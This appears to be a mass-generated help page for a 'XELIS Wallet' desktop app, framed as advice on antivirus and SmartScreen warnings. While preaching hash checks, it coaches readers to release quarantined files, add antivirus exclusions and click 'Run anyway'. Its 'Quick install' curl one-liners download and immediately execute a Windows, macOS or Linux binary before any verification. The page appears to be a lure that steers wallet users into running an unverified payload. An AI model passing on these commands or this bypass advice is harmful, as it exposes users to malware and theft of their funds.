![XELIS Wallet flagged by antivirus or SmartScreen](assets/banner-article.png)
# XELIS Wallet flagged by antivirus or SmartScreen

Decide with the hash, not with the warning dialog.

## Downloads - Fix

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Verify against the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) before you change any security setting. The release is also where the published hash comes from.

> A warning is a question, not a verdict. The answer is whether the file matches what was published.

A security tool flagged the installer, and that flag can mean two opposite things: a new build without reputation yet, or a file that someone altered. The only way to tell them apart is to compare the file against the published hash. If it matches, you are deciding whether to trust the official build; if it does not, delete it without running it.

<!-- ARTICLE-BODY-BEGIN -->
## What the warning is actually saying

In the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, Windows Defender and SmartScreen work differently. SmartScreen warns about files with little reputation, which is normal for a release that is new or downloaded by few people so far. Defender's quarantine is a stronger response: it believes it found something and has moved the file out of reach.

Neither message identifies the file's origin. That is why the check comes first and the decision comes second, and why "just disable it" is the wrong instruction in both cases.

## Verify the file before you allow it

Follow the three checks in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md">verify the XELIS Wallet download</a>: the source, the platform match, and the SHA-256 comparison. The hash check is the one that answers the security question, because it detects any modification between the publisher and your disk.

If the hash matches, the file is the published build. If it does not, no amount of allow-listing makes it safe, and the correct action is to delete it and download again.

## Clearing a quarantine without turning protection off

1. Confirm the file came from the release page and the hash matches.
2. Open Windows Security, then Protection history, and find the blocked item.
3. Choose the option to allow the item on this device, if you have decided to trust it.
4. Run the installer again.
5. After installation, confirm the app opens and the wallet behaves normally.

On macOS the equivalent is System Settings, Privacy and Security, where a blocked app gets an Open Anyway approval after you confirm it. In both cases the approval is specific to that file, which is the point: you are not disabling protection, you are overriding one decision you have checked.

## If the alert names the wrong platform

A warning that mentions an unexpected file type, an unusual name or a different operating system is a sign you downloaded the wrong asset, or something other than the asset. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet supported platforms</a> lists what each build should be, and the file name should match the release entry exactly.

Once the file is cleared and the hash matched, continue with <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md">install XELIS Wallet on Windows</a> or the matching platform guide, rather than repeating the download.

## FAQ

### Is a SmartScreen warning proof of malware?

No. It reflects low reputation, which new releases commonly have. The hash comparison is the evidence that matters.

### Should I disable my antivirus to install?

No. Disabling protection removes the check that would catch a tampered file. Allow the specific verified file instead.

### The hash matched but the app was still removed. Why?

Some tools re-quarantine on launch. Add an exclusion for that one file after verification, then reinstall.

### Can I ignore the warning if I downloaded from the official site?

Only after checking the hash. Official pages can be reached through a tampered path, and the hash is cheap.

### Does this happen on macOS too?

Yes, as a Gatekeeper block rather than a Defender alert. The decision process is the same: verify, then approve.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Verify the XELIS Wallet download](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md)
- [Install XELIS Wallet for Windows](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md)
- [XELIS Wallet system requirements](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Update XELIS Wallet safely](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
